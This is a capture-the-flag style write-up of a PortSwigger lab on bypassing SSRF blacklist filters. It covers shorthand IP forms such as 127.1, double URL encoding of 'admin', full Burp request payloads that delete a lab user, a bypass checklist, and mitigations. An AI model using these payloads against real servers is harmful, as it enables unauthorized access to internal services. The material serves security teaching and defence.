# 📘 PortSwigger Lab: SSRF with blacklist-based input filters

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-based-input-filter  
> 🎯 Topic: Server-Side Request Forgery (SSRF) — bypassing blacklist filters  
> 🧪 Difficulty: Apprentice  
> ✅ Status: Solved  

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [🚫 What Is a Blacklist Filter](#blacklist)
- [📐 Alternative IP Representations](#ip-forms)
- [🔤 URL Encoding and Case Variation](#encoding)
- [🔍 Step 1 — Intercept the Stock Check Request](#step1)
- [🔍 Step 2 — Confirm the Vulnerability and Map the Filter](#step2)
- [🔍 Step 3 — Bypass the IP Block with 127.1](#step3)
- [🔍 Step 4 — Bypass the admin Block with Double Encoding](#step4)
- [🔍 Step 5 — Read the Admin Interface](#step5)
- [🔍 Step 6 — Delete User carlos](#step6)
- [📨 Example Intercepted Requests](#requests)
- [📥 Example Result](#response)
- [🧾 Complete Attack Chain](#attack-chain)
- [🔬 Why the Attack Worked](#breakdown)
- [🧠 Pentester Mindset](#pentester)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)
- [🧾 Conclusion](#conclusion)

---

<a id="goal"></a>

## 🎯 Goal

Use the stock check feature to:

```text
1. Bypass two blacklist filters:
   — the block on the address 127.0.0.1;
   — the block on the word "admin".

2. Reach the admin interface at 127.0.0.1/admin.

3. Delete the user carlos.
```

---

<a id="theory"></a>

## 🧠 Short Theory

In previous labs the application did not filter `stockApi` at all. In this lab the developer added a defense — a **blacklist**:

```text
the address 127.0.0.1 (and possibly localhost) is blocked;
the word admin in the URL is blocked.
```

A blacklist is an enumeration of "bad" strings. It works only while the attacker uses exactly the strings the developer listed. But a single address has **countless representations**, and a filter that compares strings does not recognize all of them.

---

<a id="idea"></a>

## 🧩 Core Idea

The filter compares **strings**, while the network stack understands **IP addresses and paths**. These two layers see the request differently:

```text
Filter sees:        http://127.1/%2561dmin
Network stack sees: http://127.0.0.1/admin
```

This exact gap is exploited:

```text
127.1       → the network stack understands it as 127.0.0.1, the filter does not block it
%2561dmin   → the filter decodes once and does not see "admin",
              the HTTP client decodes again and goes to /admin
```

---

<a id="blacklist"></a>

## 🚫 What Is a Blacklist Filter

The logic looks roughly like this:

```python
blocked_strings = ["127.0.0.1", "localhost", "admin"]

for bad in blocked_strings:
    if bad in url:
        return "Blocked"
```

Weak points of a blacklist:

```text
1. An enumeration cannot cover every way to write a single address.
2. Checking a string ≠ checking where the request will actually go.
3. Decoding on the filter side and on the client side can be desynchronized.
```

The confrontation formula:

```text
Blacklist = "I know all the bad variants"
Attack    = "I will come up with a variant you do not know"
```

---

<a id="ip-forms"></a>

## 📐 Alternative IP Representations

The address `127.0.0.1` can be written in many ways:

| Form | Notation | How It Is Derived |
|---|---|---|
| Standard | `127.0.0.1` | classic dotted quad |
| Decimal (integer) | `2130706433` | `127×256³ + 0×256² + 0×256 + 1` |
| Octal | `017700000001` | each octet in base 8: `0177.0.0.01` |
| Hexadecimal | `0x7f000001` | `0x7f` = 127 |
| Shorthand | `127.1` | missing octets are zero |
| Shorthand | `127.0.1` | also read as `127.0.0.1` |

How to compute the decimal form:

```text
127 × 16777216 = 2130706432   (this is 127.0.0.0)
+ 1                           (the last octet)
= 2130706433                  (this is 127.0.0.1)
```

The key trick of the lab:

```text
127.1
```

The URL parser understands that there are fewer than four octets, pads the missing ones with zeros, and gets `127.0.0.1`. The filter looks for the substring `127.0.0.1` — it is not present in `127.1` → the block is bypassed.

---

<a id="encoding"></a>

## 🔤 URL Encoding and Case Variation

The word `admin` can be hidden from the filter:

```text
Single encoding:    /%61dmin        → after decoding /admin
Double encoding:    /%2561dmin      → %25 → %, then %61 → a
Case variation:     /AdMiN, /ADMIN  → paths are often case-insensitive
```

Why double encoding works:

```text
Filter:        http://127.1/%2561dmin
               decodes once → http://127.1/%61dmin
               no "admin" substring → pass ✅

HTTP client:   http://127.1/%61dmin
               decodes again → GET /admin ✅
```

The desynchronization scheme:

```text
Filter:   %2561dmin ──(decode ×1)──> %61dmin   → "admin" not found
Client:   %61dmin   ──(decode ×1)──> admin      → request goes to /admin
```

The principle is the same as in Path Traversal with a null byte:

```text
There:   the check sees "…passwd%00.png", the file system sees "…passwd"
Here:    the filter sees "%2561dmin", the HTTP client sees "admin"
```

**The check and the execution see different strings** — the root of all these bypasses.

---

<a id="step1"></a>

## 🔍 Step 1 — Intercept the Stock Check Request

1. Open any product page.
2. Enable interception in Burp Proxy (Intercept on).
3. Click:

```text
Check stock
```

4. Intercept the request:

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=...
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1
```

5. Send it to Repeater:

```text
Right click → Send to Repeater
```

---

<a id="step2"></a>

## 🔍 Step 2 — Confirm the Vulnerability and Map the Filter

Try different `stockApi` values one by one and record the responses:

```text
stockApi=http://127.0.0.1/admin        → blocked (the filter recognized the address)
stockApi=http://localhost/admin        → blocked (the filter recognized the hostname)
stockApi=http://127.1/admin            → IP passes, but the word admin is blocked
stockApi=http://2130706433/admin       → result depends on the filter
stockApi=http://017700000001/admin     → result depends on the filter
```

This builds the filter map:

```text
What exactly is blocked: 127.0.0.1? localhost? the word "admin"?
Which address forms pass: 127.1? decimal? octal?
```

In this lab the filter has two rules:

```text
rule 1: 127.0.0.1 (and similar strings) → block
rule 2: admin                           → block
```

---

<a id="step3"></a>

## 🔍 Step 3 — Bypass the IP Block with 127.1

Replace the address with the shorthand form:

```text
stockApi=http://127.1/admin
```

What happens:

```text
The filter looks for "127.0.0.1" → not found in "127.1" → the address passes
The URL parser understands "127.1" as 127.0.0.1 → the request goes to loopback
```

But the response comes back with an error — because the word `admin` is still blocked by the second rule.

---

<a id="step4"></a>

## 🔍 Step 4 — Bypass the admin Block with Double Encoding

Replace the path with double encoding:

```text
stockApi=http://127.1/%2561dmin
```

Breakdown:

```text
%25     → the % character (one decoding pass)
%61     → the letter a
dmin    → the rest of the word
```

After all decoding:

```text
%2561dmin  →  %61dmin  →  admin
```

Request:

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

stockApi=http://127.1/%2561dmin
```

Response — the admin interface.

---

<a id="step5"></a>

## 🔍 Step 5 — Read the Admin Interface

The response contains the admin HTML:

```html
<h1>Users</h1>
<div>
    <span>carlos - </span>
    <a href="/admin/delete?username=carlos">Delete</a>
</div>
```

The link contains the path:

```text
/admin/delete?username=carlos
```

It must also be sent in the bypass form:

```text
/%2561dmin/delete?username=carlos
```

---

<a id="step6"></a>

## 🔍 Step 6 — Delete User carlos

Final request:

```text
stockApi=http://127.1/%2561dmin/delete?username=carlos
```

Full request:

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

stockApi=http://127.1/%2561dmin/delete?username=carlos
```

The lab is marked:

```text
Solved
```

---

<a id="requests"></a>

## 📨 Example Intercepted Requests

### Original (legitimate)

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1
```

### Blocked (baseline for comparison)

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

stockApi=http://127.0.0.1/admin
```

Filter response (example):

```http
HTTP/1.1 400 Bad Request
...

External stock check blocked for: http://127.0.0.1/admin
```

### Working — access to the admin panel

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

stockApi=http://127.1/%2561dmin
```

### Working — user deletion

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

stockApi=http://127.1/%2561dmin/delete?username=carlos
```

---

<a id="response"></a>

## 📥 Example Result

### Response to the admin panel request

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
...

<!DOCTYPE html>
<html>
...
<h1>Users</h1>
<div>
    <span>carlos - </span>
    <a href="/admin/delete?username=carlos">Delete</a>
</div>
...
```

### Response to the deletion request

```http
HTTP/1.1 200 OK
...
```

and the lab status:

```text
Solved
```

---

<a id="attack-chain"></a>

## 🧾 Complete Attack Chain

```text
1. Open the lab
2. Open a product page
3. Intercept POST /product/stock
4. Send the request to Repeater
5. Test stockApi=http://127.0.0.1/admin → blocked (baseline)
6. Replace the address with 127.1 → the IP filter is bypassed
7. Replace the path with /%2561dmin → the admin word filter is bypassed
8. Read the admin panel, find the link /admin/delete?username=carlos
9. Send stockApi=http://127.1/%2561dmin/delete?username=carlos
10. User carlos deleted
11. Lab marked as Solved
```

---

<a id="breakdown"></a>

## 🔬 Why the Attack Worked

### 1. The Filter Compares Strings, Not Addresses

The blacklist looks for the substring `127.0.0.1`, but `127.1` is a different string. The network stack still understands `127.1` as the same `127.0.0.1`.

### 2. There Are Countless Ways to Write One Address

Decimal, octal, hexadecimal, shorthand forms — it is impossible to enumerate them all in a blacklist.

### 3. Decoding Is Desynchronized

The filter decodes the URL once and does not see `admin` in `%2561dmin`. The HTTP client decodes again and requests `/admin`.

### 4. Both Bypasses Combine in One URL

`127.1` defeats the first rule, `%2561dmin` defeats the second. Together they provide full access to the admin panel.

### 5. The Internal Service Does Not Require Authentication

The admin panel on loopback trusts any internal request — after bypassing the filters the attacker gains full control.

---

<a id="pentester"></a>

## 🧠 Pentester Mindset

When a filter blocks your request — do not give up, map the filter:

```text
What exactly does it block: a string? a word? a hostname? a path?
```

```text
What alternative address forms can I try?
```

```text
Does the filter decode the URL? Once or twice? What about the HTTP client?
```

```text
Are the application paths case-insensitive?
```

SSRF filter bypass checklist:

```text
127.0.0.1  →  127.1 / 2130706433 / 017700000001 / 0x7f000001
localhost  →  spoofed.burpcollaborator.net / your own domain pointing to 127.0.0.1
/admin     →  /%61dmin / %2561dmin / /AdMiN
URL filter →  open redirect: /redirect?url=http://127.0.0.1/admin
```

---

<a id="mistakes"></a>

## ❌ Common Mistakes

### Mistake 1. Stopping at the First Blocked Request

`127.0.0.1/admin` blocked is not the end — it is the start of mapping the filter.

### Mistake 2. Using Only One Bypass Form

Two rules must be bypassed: the address and the word `admin`. `127.1` without path encoding does not solve the task.

### Mistake 3. Confusing Single and Double Encoding

The filter decodes `%61dmin` to `admin` and blocks it. You need exactly `%2561dmin`.

### Mistake 4. Encoding the Wrong Part of the URL

Encode the word `admin` in the path, not the whole URL.

### Mistake 5. Forgetting the Path in the Final Request

When deleting the user, the path `/delete?username=carlos` is appended to the bypass form of `/admin`:

```text
/%2561dmin/delete?username=carlos
```

### Mistake 6. Sending the Final Request to the Plain Path

`/admin/delete?username=carlos` hits the admin word filter again.

### Mistake 7. Not Watching Content-Length

When manually changing the request body, ensure `Content-Length` matches the new length (Repeater updates it automatically by default).

---

<a id="defense"></a>

## 🛡 Mitigation

### 1. Whitelist Instead of Blacklist

Allow only known-good values instead of blocking known-bad ones:

```python
allowed_apis = {
    "stock": "http://internal-stock-api:8080/check",
}
api = allowed_apis[user_input]
```

### 2. Validation at the Resolved-IP Level

Resolve the hostname and check that the final IP is not in private ranges:

```text
127.0.0.0/8        loopback
10.0.0.0/8         private
172.16.0.0/12      private
192.168.0.0/16     private
169.254.169.254    cloud metadata
```

### 3. Defend Against DNS Rebinding

Validate the IP after resolution and perform the request against that exact IP.

### 4. Canonicalize the URL Before Checking

Decode the URL (once, fully), normalize it to a canonical form, and only then validate.

### 5. Authenticate Internal Services

Admin panels and APIs must not trust requests just because of their network location.

### 6. Egress Filtering and Segmentation

Restrict where the application can connect (network policy, firewall).

### 7. Log Outgoing Requests

Record the URLs the server fetches to detect scanning and bypass attempts.

---

<a id="checklist"></a>

## ✅ Checklist

### Reconnaissance

- [ ] Opened a product page
- [ ] Intercepted the `POST /product/stock` request
- [ ] Found the `stockApi` parameter
- [ ] Sent the request to Repeater

### Filter Mapping

- [ ] `http://127.0.0.1/admin` → blocked (baseline)
- [ ] `http://localhost/admin` → blocked (baseline)
- [ ] Determined which IP forms pass

### Bypassing the Filters

- [ ] Address replaced with `127.1` → the IP filter is bypassed
- [ ] Path replaced with `/%2561dmin` → the admin word filter is bypassed
- [ ] Admin panel read

### Exploitation

- [ ] Found the link `/admin/delete?username=carlos`
- [ ] Sent `stockApi=http://127.1/%2561dmin/delete?username=carlos`
- [ ] User `carlos` deleted
- [ ] Lab status: Solved

---

<a id="conclusion"></a>

## 🧾 Conclusion

The lab was solved through a combination of two blacklist bypasses:

```text
127.1           — shorthand form of 127.0.0.1 that the filter did not recognize
%2561dmin       — double encoding of the word admin:
                  the filter decodes once and does not see "admin",
                  the HTTP client decodes again and goes to /admin
```

Final request:

```text
stockApi=http://127.1/%2561dmin/delete?username=carlos
```

Main lessons:

```text
A blacklist loses because one address has countless representations.
```

```text
The filter and the execution see different strings — that is the bypass space.
```

```text
Double encoding works when the filter decodes the URL once and the client decodes again.
```

```text
The right defense is a whitelist plus validation of the resolved IP, not an enumeration of bans.
```

---

[⬆ Back to top](#top)
